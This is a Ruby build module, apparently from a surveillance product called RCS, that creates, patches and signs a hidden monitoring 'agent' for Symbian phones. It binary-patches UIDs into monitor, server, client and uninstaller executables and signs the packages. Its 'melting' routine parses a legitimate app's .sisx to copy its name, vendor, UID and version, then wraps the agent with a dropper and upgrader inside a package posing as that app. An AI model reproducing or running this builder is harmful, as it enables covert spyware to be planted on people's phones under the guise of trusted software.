#
#  Agent creation for symbian
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/binary'

require 'yaml'
require 'find'

module RCS
module DB

class BuildSymbian < Build

  def initialize
    super
    @platform = 'symbian'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = '5th/SharedQueueMon_20023635.exe'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :symbian, params['demo']

    # invoke the generic patch method with the new params
    super

    params[:core] = '3rd/SharedQueueMon_20023635.exe'
    # invoke the generic patch method with the new params
    super

    params[:core] = 'symbian3/SharedQueueMon_20023635.exe'
    params[:config] = '2009093023'

    # invoke the generic patch method with the new params
    super

    raise "Cannot find UIDS file" unless File.exist? Config.instance.cert("symbian.uids")

    yaml = File.open(Config.instance.cert("symbian.uids"), 'rb') {|f| f.read}
    @uids = YAML.load(yaml)

    # the UIDS must be 8 chars (padded with zeros)
    @uids.collect! {|u| u.rjust(8, '0')}

    trace :debug, "Build: signing with UIDS #{@uids.inspect}"

    # substitute the UIDS into every file
    Find.find(@tmpdir).each do |file|
      if File.file?(file)
        content = File.open(file, 'rb') {|f| f.read}
        content.binary_patch '[:UID1:]', @uids[0] rescue nil
        content.binary_patch '[:UID2:]', @uids[1] rescue nil
        content.binary_patch '[:UID3:]', @uids[2] rescue nil
        content.binary_patch '[:UID4:]', @uids[3] rescue nil
        content.binary_patch '[:UID5:]', @uids[4] rescue nil
        content.binary_patch '[:UID6:]', @uids[5] rescue nil
        content.gsub! /SharedQueueCli_20023633\{000a0000\}\[[a-z0-9]*\].dll/, "SharedQueueCli_20023633{000a0000}[#{@uids[3]}].dll" rescue nil
        File.open(file, 'wb') {|f| f.write content}
      end
    end

    FileUtils.cp(path('symbian3/rsc'), path("symbian3/#{@uids[0]}.rsc"))
    FileUtils.cp(path('5th/rsc'), path("5th/#{@uids[0]}.rsc"))
    FileUtils.cp(path('3rd/rsc'), path("3rd/#{@uids[0]}.rsc"))

    trace :debug, "Build: rebuilding with petran"

    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[1]} -sid 0x#{@uids[1]} -compress #{path('symbian3/SharedQueueMon_20023635.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[1]} -sid 0x#{@uids[1]} -compress #{path('5th/SharedQueueMon_20023635.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[1]} -sid 0x#{@uids[1]} -compress #{path('3rd/SharedQueueMon_20023635.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[2]} -sid 0x#{@uids[2]} -compress #{path('symbian3/SharedQueueSrv_20023634.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[2]} -sid 0x#{@uids[2]} -compress #{path('5th/SharedQueueSrv_20023634.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[2]} -sid 0x#{@uids[2]} -compress #{path('3rd/SharedQueueSrv_20023634.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[3]} -sid 0x#{@uids[3]} -compress #{path('symbian3/SharedQueueCli_20023633.dll')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[3]} -sid 0x#{@uids[3]} -compress #{path('5th/SharedQueueCli_20023633.dll')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[3]} -sid 0x#{@uids[3]} -compress #{path('3rd/SharedQueueCli_20023633.dll')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[4]} -sid 0x#{@uids[4]} -compress #{path('symbian3/Uninstaller.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[4]} -sid 0x#{@uids[4]} -compress #{path('5th/Uninstaller.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[4]} -sid 0x#{@uids[4]} -compress #{path('3rd/Uninstaller.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[5]} -sid 0x#{@uids[5]} -compress #{path('symbian3/UninstMonitor.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[5]} -sid 0x#{@uids[5]} -compress #{path('5th/UninstMonitor.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[5]} -sid 0x#{@uids[5]} -compress #{path('3rd/UninstMonitor.exe')}"

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'
    @melted = params['input'] ? true : false

    trace :debug, "Build: creating sis files"

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('symbian3')}
    File.exist? path('symbian3/uninstaller.sis') or raise("makesis failed for uninstaller symbian3")

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('5th')}
    File.exist? path('5th/uninstaller.sis') or raise("makesis failed for uninstaller 5th")

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('3rd')}
    File.exist? path('3rd/uninstaller.sis') or raise("makesis failed for uninstaller 3rd")

    if @melted
      @appname_orig = params['filename']
      FileUtils.mkdir_p(path('melting/working'))
      FileUtils.mv Config.instance.temp(params['input']), path("melting/working/#{@appname_orig}")
      # get info from the original sisx (host)
      @melted_uid, @melted_name, @melted_vendor, @melted_major, @melted_minor = get_app_info(path("melting/working/#{@appname_orig}"))
    end

  end

  def sign(params)
    trace :debug, "Build: signing: #{params}"

    trace :debug, "Build: creating sisx files"

    params['cert'] or raise "no cert provided"
    params['key'] or raise "no key provided"

    # this certificate are provided by the console
    FileUtils.mv(Config.instance.temp(params['cert']), path('symbian.cer'))
    FileUtils.mv(Config.instance.temp(params['key']), path('symbian.key'))

    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('symbian3')}
    File.exist? path('symbian3/uninstaller.sisx') or raise("signsis failed for uninstaller symbian3")

    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('5th')}
    File.exist? path('5th/uninstaller.sisx') or raise("signsis failed for uninstaller 5th")

    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('3rd')}
    File.exist? path('3rd/uninstaller.sisx') or raise("signsis failed for uninstaller 3rd")

    trace :debug, "Build: final installer #{params['edition']}"

    raise "invalid edition" if params['edition'].nil?
    
    CrossPlatform.exec path('makesis'), "installer-#{params['edition']}.pkg installer.sis", {chdir: path('')}
    File.exist? path('installer.sis') or raise("makesis failed for installer")

    CrossPlatform.exec path('signsis'), "-s installer.sis #{@appname}.sisx symbian.cer symbian.key", {chdir: path('')}
    File.exist? path(@appname + '.sisx') or raise("signsis failed for installer")

    @outputs += ['installer.sis', @appname + '.sisx']

    # ugly ugly ugly hack to permit melting
    # we cannot perform it in the 'melt' method since the melting needs the agent already signed
    if @melted
      FileUtils.cp path(@appname + '.sisx'), path("melting/working/plugin.sisx")

      # create dropper.pkg
      if File.file?(path("melting/#{params['edition']}/dropper.pkg"))
      	content = File.open(path("melting/#{params['edition']}/dropper.pkg"), 'rb') {|f| f.read}
      	content.gsub! '[:uniquevendorname:]', @melted_vendor
      	File.open(path("melting/working/dropper.pkg"), 'wb') {|f| f.write content}
      end

      FileUtils.cp path("melting/#{params['edition']}/upgrader.exe"), path("melting/working/upgrader.exe")

      CrossPlatform.exec path('petran'), "-uid3 0x#{@uids[4]} -sid 0x#{@uids[4]} -compress #{path('melting/working/upgrader.exe')}"

      CrossPlatform.exec path('makesis'), "dropper.pkg upgrader.sis", {chdir: path('melting/working')}
      File.exist? path('melting/working/upgrader.sis') or raise("makesis failed for upgrader")

      CrossPlatform.exec path('signsis'), "-s upgrader.sis upgrader.sisx ../../symbian.cer ../../symbian.key", {chdir: path('melting/working')}
      File.exist? path('melting/working/upgrader.sisx') or raise("signsis failed for upgrader")

      # Create melting.sisx
      if File.file?(path("melting/melting.pkg"))
        content = File.open(path("melting/melting.pkg"), 'rb') {|f| f.read}
        content.gsub! '[:appname:]', @melted_name
        content.gsub! '[:uniquevendorname:]', @melted_vendor
        content.gsub! '[:major:]', @melted_major
        content.gsub! '[:minor:]', @melted_minor
        content.gsub! '[:packagename:]', "#{@appname_orig}"
        content.gsub! '[:uid:]', @melted_uid
        File.open(path("melting/working/melting.pkg"), 'wb') {|f| f.write content}
      end

      CrossPlatform.exec path('makesis'), "melting.pkg melted.sis", {chdir: path('melting/working')}
      File.exist? path('melting/working/melted.sis') or raise("makesis failed for melted")

      CrossPlatform.exec path('signsis'), "-s melted.sis melted.sisx ../../symbian.cer ../../symbian.key", {chdir: path('melting/working')}
      File.exist? path("melting/working/melted.sisx") or raise("signsis failed for melted")

      FileUtils.cp path("melting/working/melted.sisx"), path(@appname_orig)

      @outputs += [@appname_orig]
    end
    
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    name = @melted ? @appname_orig : @appname + '.sisx'

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(name, "wb") { |f| f.write File.open(path(name), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('5th/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
      add_magic(core_content)
      z.file.open('5th/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }

      core_content = z.file.open('3rd/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
      add_magic(core_content)
      z.file.open('3rd/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }

      core_content = z.file.open('symbian3/SharedQueueMon_20023635.exe', "rb") { |f| f.read }
      add_magic(core_content)
      z.file.open('symbian3/SharedQueueMon_20023635.exe', "wb") { |f| f.write core_content }
    end
  end


  def get_app_info(file)
    # Read info from original package

    fd = File.open(file, "rb")
    raise "Invalid input file" unless fd

    # read UID
    fd.pos = 8
    uid = fd.read(4).unpack("h*").first.reverse

    # read size and check if it's on 4 or 8 bytes
    offset = 20
    fd.pos = offset
    sis_size = fd.read(4).unpack("L_").first
    offset += ((sis_size & 32768) == 1) ? 8 : 4

    # now we are in SISControllerChecksum, it's a 12 bytes info
    # optional, may not be present
    fd.pos = offset
    offset += 12 if fd.read(4).unpack("L_").first == 34

    # now we are in SISDataChecksum, it's a 12 bytes info, optional
    # optional, may not be present
    fd.pos = offset
    offset += 12 if fd.read(4).unpack("L_").first == 35

    # now, we could be in SISCompressed
    fd.pos = offset

    if fd.read(4).unpack("L_").first == 3
      offset += 4
      fd.pos = offset
      # length 4 or 8 bytes?
      if (fd.read(4).unpack("L_").first & 32768) == 1
        fd.pos = offset
        siscompressedlength = fd.read(8).unpack("L_").first
        offset += 8
      else
        fd.pos = offset
        siscompressedlength = fd.read(4).unpack("L_").first
        offset += 4
      end

      fd.pos = offset

      if fd.read(4).unpack("L_").first == 1
        offset += 12
        compressedDataLength = siscompressedlength - 12

        fd.pos = offset
        compresseddata = fd.read(compressedDataLength)
        zstream = Zlib::Inflate.new
        buf = zstream.inflate(compresseddata)
        zstream.finish
        zstream.close
      else
        offset += 12
        uncompressedDataLength = siscompressedlength - 12
        fd.pos = offset
        buf = fd.read(uncompressedDataLength)
      end

      fd.close
    else
      raise "Invalid input sisx"
    end

    # now we should be in SISController
    index = 4
    length = buf.slice(index, 4).unpack("L_").first
    index += ((length & 1) == 1) ? 8 : 4

    #now we should be in SISInfo
    index += 4
    length= buf.slice(index, 4).unpack("L_").first
    if (length & 1) == 1
      length =  buf.slice(index, 8).unpack("L_").first
      index += 8
    else
      length = buf.slice(index, 4).unpack("L_").first
      index += 4
    end

    infobuf = buf.slice(index, length)

    # now we are in SISInfo... at last
    # skip SISUid, 12 bytes
    index = 12
    # read unique vendor name
    index += 4
    length = infobuf.slice(index, 4).unpack("L_").first
    index += 4
    uniquevendorname = infobuf.slice(index,length).force_encoding("utf-16le").encode("utf-8")

    # caution! length is padded to the first 4 bytes multiple
    hop = ((length % 4) == 0) ? length : length + (4 - (length % 4))
    index += hop

    # read the first name and skip the array of names
    index += 4
    namelen = infobuf.slice(index + 8, 4).unpack("L_").first
    appname = infobuf.slice(index + 12, namelen).force_encoding("utf-16le").encode("utf-8")
    length = infobuf.slice(index, 4).unpack("L_").first
    index += (length + 4)

    # skip the array of vendor names
    index += 4
    length = infobuf.slice(index,4).unpack("L_").first
    index += (length + 4)

    # read version
    index += 8
    major = infobuf.slice(index,4).unpack("L_").first.to_s
    index += 4
    minor = infobuf.slice(index,4).unpack("L_").first.to_s

    trace :debug, "Symbian melting info: #{uid} #{appname} #{uniquevendorname} #{major}.#{minor}"

    return uid, appname, uniquevendorname, major, minor
  end

end

end #DB::
end #RCS::
